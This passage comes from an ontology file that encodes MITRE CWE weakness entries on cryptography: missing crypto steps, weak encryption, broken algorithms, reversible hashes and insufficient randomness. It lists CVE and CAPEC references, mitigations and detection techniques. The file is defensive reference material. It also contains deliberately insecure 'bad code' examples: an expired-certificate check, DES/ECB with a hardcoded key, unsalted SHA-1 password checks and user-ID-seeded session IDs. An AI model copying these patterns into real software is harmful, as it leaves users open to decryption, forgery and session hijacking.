(bad code)
Example Language: C 
if (cert = SSL_get_peer_certificate(ssl)) {
foo=SSL_get_verify_result(ssl);
if ((X509_V_OK==foo) || (X509_V_ERRCERT_NOT_YET_VALID==foo))

//do stuff 
}
The code checks if the certificate is not yet valid, but it fails to check if a certificate is past its expiration date, thus treating expired certificates as valid."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-325_Missing_Required_Cryptographic_Step

    Annotations: 
        rdfs:comment "Cryptographic implementations should follow the algorithms that define them exactly, otherwise encryption can be weaker than expected."^^xsd:string,
        rdfs:comment "Functional Areas:
Cryptography"^^xsd:string,
        rdfs:comment "The software does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by that algorithm."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Missing challenge-response step allows authentication bypass using public key."^^xsd:string
                 
                 references  CVE-2001-1585,
     
     Annotations: rdfs:comment "Subvert Code-signing Facilities"^^xsd:string
                 
                 related_attack_patterns  CAPEC-68,
     ID  "325"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If the cryptographic algorithm is used for authentication and authorization, then an attacker could gain unauthorized access to the system."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven."^^xsd:string
                 
                 accountability  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Sensitive data may be compromised by the use of a broken or risky cryptographic algorithm."^^xsd:string
                 
                 confidentiality  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Sensitive data may be compromised by the use of a broken or risky cryptographic algorithm."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic.

Developers sometimes omit certain \"expensive\" (resource-intensive) steps in order to improve performance, especially in devices with limited memory or CPU cycles. This could be done under a mistaken impression that the step is unnecessary for preserving security. Alternately, the developer might adopt a threat model that is inconsistent with that of its consumers by accepting a risk for which the remaining protection seems \"good enough.\""^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Sensitive data may be compromised by the use of a broken or risky cryptographic algorithm."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Sensitive data may be compromised by the use of a broken or risky cryptographic algorithm."^^xsd:string
                 
                 integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "This issue can be introduced when the requirements for the algorithm are not clearly stated."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-326_Inadequate_Encryption_Strength

    Annotations: 
        rdfs:comment "A weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources."^^xsd:string,
        rdfs:comment "Maintenance:
A variety of encryption algorithms exist, with various weaknesses. This category could probably be split into smaller sub-categories."^^xsd:string,
        rdfs:comment "Maintenance:
Relationships between CWE-310, CWE-326, and CWE-327 and all their children need to be reviewed and reorganized."^^xsd:string,
        rdfs:comment "The software stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Weak encryption"^^xsd:string
                 
                 references  CVE-2001-1546,
     
     Annotations: rdfs:comment "Weak encryption"^^xsd:string
                 
                 references  CVE-2002-1682,
     
     Annotations: rdfs:comment "Weak encryption produces same ciphertext from the same plaintext blocks."^^xsd:string
                 
                 references  CVE-2002-1697,
     
     Annotations: rdfs:comment "Weak encryption"^^xsd:string
                 
                 references  CVE-2002-1739,
     
     Annotations: rdfs:comment "Weak encryption (XOR)"^^xsd:string
                 
                 references  CVE-2002-1872,
     
     Annotations: rdfs:comment "Weak encryption (reversible algorithm)."^^xsd:string
                 
                 references  CVE-2002-1910,
     
     Annotations: rdfs:comment "Weak encryption (one-to-one mapping)."^^xsd:string
                 
                 references  CVE-2002-1946,
     
     Annotations: rdfs:comment "Encryption error uses fixed salt, simplifying brute force / dictionary attacks (overlaps randomness)."^^xsd:string
                 
                 references  CVE-2002-1975,
     
     Annotations: rdfs:comment "Weak encryption (chosen plaintext attack)"^^xsd:string
                 
                 references  CVE-2004-2172,
     
     Annotations: rdfs:comment "Weak encryption scheme"^^xsd:string
                 
                 references  CVE-2005-2281,
     
     Annotations: rdfs:comment "Brute Force"^^xsd:string
                 
                 related_attack_patterns  CAPEC-112,
     
     Annotations: rdfs:comment "Protocol Analysis"^^xsd:string
                 
                 related_attack_patterns  CAPEC-192,
     
     Annotations: rdfs:comment "Encryption Brute Forcing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-20,
     ID  "326"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker may be able to decrypt the data using brute force attacks."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to decrypt the data using brute force attacks."^^xsd:string
                 
                 access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use a cryptographic algorithm that is currently considered to be strong by experts in the field."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to decrypt the data using brute force attacks."^^xsd:string
                 
                 confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to decrypt the data using brute force attacks."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-327_Use_of_a_Broken_or_Risky_Cryptographic_Algorithm

    Annotations: 
        rdfs:comment "Background Details:
Cryptographic algorithms are the methods by which data is scrambled. There are a small number of well-understood and heavily studied algorithms that should be used by most applications. It is quite difficult to produce a secure algorithm, and even high profile algorithms by accomplished cryptographic experts have been broken.

Since the state of cryptography advances so rapidly, it is common for an algorithm to be considered \"unsafe\" even if it was once thought to be strong. This can happen when new attacks against the algorithm are discovered, or if computing power increases so much that the cryptographic algorithm no longer provides the amount of protection that was originally thought."^^xsd:string,
        rdfs:comment "Maintenance:
Relationships between CWE-310, CWE-326, and CWE-327 and all their children need to be reviewed and reorganized."^^xsd:string,
        rdfs:comment "The use of a broken or risky cryptographic algorithm is an unnecessary risk that may result in the exposure of sensitive information."^^xsd:string,
        rdfs:comment "The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has been protected. Well-known techniques may exist to break the algorithm."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Attackers can infer private IP addresses by dividing each octet by the MD5 hash of '20'."^^xsd:string
                 
                 references  CVE-2002-2058,
     
     Annotations: rdfs:comment "Default configuration of product uses MD5 instead of stronger algorithms that are available, simplifying forgery of certificates."^^xsd:string
                 
                 references  CVE-2005-2946,
     
     Annotations: rdfs:comment "Product substitutes characters with other characters in a fixed way, and also leaves certain input characters unchanged."^^xsd:string
                 
                 references  CVE-2005-4860,
     
     Annotations: rdfs:comment "product only uses \"XOR\" to obfuscate sensitive data"^^xsd:string
                 
                 references  CVE-2007-4150,
     
     Annotations: rdfs:comment "product only uses \"XOR\" and a fixed key to obfuscate sensitive data"^^xsd:string
                 
                 references  CVE-2007-5460,
     
     Annotations: rdfs:comment "Product uses the hash of a hash for authentication, allowing attackers to gain privileges if they can obtain the original hash."^^xsd:string
                 
                 references  CVE-2007-6013,
     
     Annotations: rdfs:comment "Product uses DES when MD5 has been specified in the configuration, resulting in weaker-than-expected password hashes."^^xsd:string
                 
                 references  CVE-2008-3188,
     
     Annotations: rdfs:comment "Product uses \"ROT-25\" to obfuscate the password in the registry."^^xsd:string
                 
                 references  CVE-2008-3775,
     
     Annotations: rdfs:comment "Encryption Brute Forcing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-20,
     
     Annotations: rdfs:comment "Creating a Rogue Certification Authority Certificate"^^xsd:string
                 
                 related_attack_patterns  CAPEC-459,
     
     Annotations: rdfs:comment "Signature Spoof"^^xsd:string
                 
                 related_attack_patterns  CAPEC-473,
     
     Annotations: rdfs:comment "Cryptanalysis of Cellular Encryption"^^xsd:string
                 
                 related_attack_patterns  CAPEC-608,
     
     Annotations: rdfs:comment "Rooting SIM Cards"^^xsd:string
                 
                 related_attack_patterns  CAPEC-614,
     
     Annotations: rdfs:comment "Cryptanalysis"^^xsd:string
                 
                 related_attack_patterns  CAPEC-97,
     ID  "327"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven."^^xsd:string
                 
                 accountability  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Carefully manage and protect cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography itself is irrelevant."^^xsd:string, 
                 rdfs:comment "Design the software so that one cryptographic algorithm can be replaced with another. This will make it easier to upgrade to stronger algorithms."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Industry-standard implementations will save development time and may be more likely to avoid errors that can occur during implementation of cryptographic algorithms. Consider the ESAPI Encryption feature."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.
For example, US government systems require FIPS 140-2 certification.
Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.
Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong."^^xsd:string, 
                 rdfs:comment "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "Automated methods may be useful for recognizing commonly-used libraries or features that have become obsolete.
Effectiveness: Moderate

Note: False negatives may occur if the tool is not aware of the cryptographic libraries in use, or if custom cryptography is being used."^^xsd:string
                 
                 automated_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The confidentiality of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
These code examples use the Data Encryption Standard (DES).

(bad code)
Example Language: C 
EVP_des_ecb();
(bad code)
Example Language: Java 
Cipher des=Cipher.getInstance(\"DES...\");
des.initEncrypt(key2);
(bad code)
Example Language: PHP 
function encryptPassword($password){
$iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);
$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
$key = \"This is a password encryption key\";
$encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv);
return $encryptedPassword;
}
Once considered a strong algorithm, DES now regarded as insufficient for many applications. It has been replaced by Advanced Encryption Standard (AES)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Man-in-the-middle attack tool
Cost effective for partial coverage:
Framework-based Fuzzer
Automated Monitored Execution
Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The integrity of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 manual_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Configuration Checker
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Binary / Bytecode simple extractor – strings, ELF readers, etc.
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: High"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Manual Source Code Review (not inspections)
Cost effective for partial coverage:
Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-328_Reversible_One-Way_Hash

    Annotations: 
        rdfs:comment "The product uses a hashing algorithm that produces a hash value that can be used to determine the original input, or to find an input that can produce the same hash, more efficiently than brute force techniques."^^xsd:string,
        rdfs:comment "This weakness is especially dangerous when the hash is used in security algorithms that require the one-way property to hold. For example, if an authentication system takes an incoming password and generates a hash, then compares the hash to another hash that it has stored in its authentication database, then the ability to create a collision could allow an attacker to provide an alternate password that produces the same target hash, bypassing authentication."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     
     Annotations: rdfs:comment "Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks."^^xsd:string
                 
                 references  CVE-2006-4068,
     
     Annotations: rdfs:comment "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness"^^xsd:string
                 
                 related_attack_patterns  CAPEC-461,
     
     Annotations: rdfs:comment "Subvert Code-signing Facilities"^^xsd:string
                 
                 related_attack_patterns  CAPEC-68,
     ID  "328"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (\"stretching\") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.
Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.
Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.
Effectiveness: High"^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
In both of these examples, a user is logged in if their given password matches a stored password:

(bad code)
Example Language: C 
unsigned char *check_passwd(char *plaintext) {
ctext = simple_digest(\"sha1\",plaintext,strlen(plaintext), ... );
//Login if hash matches stored hash 
if (equal(ctext, secret_password())) {
login_user();
}
}
(bad code)
Example Language: Java 
String plainText = new String(plainTextIn);
MessageDigest encer = MessageDigest.getInstance(\"SHA\");
encer.update(plainTextIn);
byte[] digest = password.digest();
//Login if hash matches stored hash 
if (equal(digest,secret_password())) {
login_user();
}
This code uses the SHA-1 hash on user passwords, but the SHA-1 algorithm is no longer considered secure. Note this code also exhibits CWE-759 (Use of a One-Way Hash without a Salt)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-330_Use_of_Insufficiently_Random_Values

    Annotations: 
        rdfs:comment "Background Details:
Computers are deterministic machines, and as such are unable to produce true randomness. Pseudo-Random Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value."^^xsd:string,
        rdfs:comment "Functional Areas:
- Cryptography
- Authentication
- Session Management"^^xsd:string,
        rdfs:comment "Relationship:
This can be primary to many other weaknesses such as cryptographic errors, authentication errors, symlink following, information leaks, and others."^^xsd:string,
        rdfs:comment "The software may use insufficiently random numbers or values in a security context that depends on unpredictable numbers."^^xsd:string,
        rdfs:comment "When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "DNS client uses predictable DNS transaction IDs, allowing DNS spoofing."^^xsd:string
                 
                 references  CVE-2008-0087,
     
     Annotations: rdfs:comment "Application generates passwords that are based on the time of day."^^xsd:string
                 
                 references  CVE-2008-0141,
     
     Annotations: rdfs:comment "SSL library uses a weak random number generator that only generates 65,536 unique keys."^^xsd:string
                 
                 references  CVE-2008-0166,
     
     Annotations: rdfs:comment "CAPTCHA implementation does not produce enough different images, allowing bypass using a database of all possible checksums."^^xsd:string
                 
                 references  CVE-2008-2020,
     
     Annotations: rdfs:comment "Chain: insufficient precision causes extra zero bits to be assigned, reducing entropy for an API function that generates random numbers."^^xsd:string
                 
                 references  CVE-2008-2108,
     
     Annotations: rdfs:comment "Web management console generates session IDs based on the login time, making it easier to conduct session hijacking."^^xsd:string
                 
                 references  CVE-2008-2433,
     
     Annotations: rdfs:comment "Handheld device uses predictable TCP sequence numbers, allowing spoofing or hijacking of TCP connections."^^xsd:string
                 
                 references  CVE-2008-3612,
     
     Annotations: rdfs:comment "Blogging software uses a hard-coded salt when calculating a password hash."^^xsd:string
                 
                 references  CVE-2008-4905,
     
     Annotations: rdfs:comment "Bulletin board application uses insufficiently random names for uploaded files, allowing other users to access private files."^^xsd:string
                 
                 references  CVE-2008-4929,
     
     Annotations: rdfs:comment "Kernel function does not have a good entropy source just after boot."^^xsd:string
                 
                 references  CVE-2008-5162,
     
     Annotations: rdfs:comment "Cryptographic key created with a seed based on the system time."^^xsd:string
                 
                 references  CVE-2009-0255,
     
     Annotations: rdfs:comment "Password recovery utility generates a relatively small number of random passwords, simplifying brute force attacks."^^xsd:string
                 
                 references  CVE-2009-2158,
     
     Annotations: rdfs:comment "Web application generates predictable session IDs, allowing session hijacking."^^xsd:string
                 
                 references  CVE-2009-2367,
     
     Annotations: rdfs:comment "Random number generator can repeatedly generate the same value."^^xsd:string
                 
                 references  CVE-2009-3238,
     
     Annotations: rdfs:comment "Crypto product uses rand() library function to generate a recovery key, making it easier to conduct brute force attacks."^^xsd:string
                 
                 references  CVE-2009-3278,
     
     Annotations: rdfs:comment "Brute Force"^^xsd:string
                 
                 related_attack_patterns  CAPEC-112,
     
     Annotations: rdfs:comment "Signature Spoofing by Key Recreation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-485,
     
     Annotations: rdfs:comment "Session Credential Falsification through Prediction"^^xsd:string
                 
                 related_attack_patterns  CAPEC-59,
     
     Annotations: rdfs:comment "Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
Attach the monitor to the process and look for library functions that indicate when randomness is being used. Run the process multiple times to see if the seed changes. Look for accesses of devices or equivalent resources that are commonly used for strong (or weak) randomness, such as /dev/urandom on Linux. Look for library or system calls that access predictable information such as process IDs and system time."^^xsd:string
                 
                 Black_Box  ""^^xsd:string,
     ID  "330"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If software relies on unique, unguessable IDs to identify a resource, an attacker might be able to guess an ID for a resource that is owned by another user. The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application."^^xsd:string, 
                 rdfs:comment "When an authorization or authentication mechanism relies on random values to restrict access to restricted functionality, such as a session ID or a seed for generating a cryptographic key, then an attacker may access the restricted functionality by guessing the ID or key."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "When an authorization or authentication mechanism relies on random values to restrict access to restricted functionality, such as a session ID or a seed for generating a cryptographic key, then an attacker may access the restricted functionality by guessing the ID or key."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "If software relies on unique, unguessable IDs to identify a resource, an attacker might be able to guess an ID for a resource that is owned by another user. The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application."^^xsd:string
                 
                 access_control  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string, 
                 rdfs:comment "Use a well-vetted algorithm that is currently considered to be strong by experts in the field, and select well-tested implementations with adequate length seeds.
In general, if a pseudo-random number generator is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts.
Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 256-bit seed is a good starting point for producing a \"random enough\" number."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "When a protection mechanism relies on random values to restrict access to a sensitive resource, such as a session ID or a seed for generating a cryptographic key, then the resource being protected could be accessed by guessing the ID or key."^^xsd:string
                 
                 confidentiality  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. 
This code generates a unique random identifier for a user's session.

(bad code)
Example Language: PHP 
function generateSessionID($userID){
srand($userID);
return rand();
}
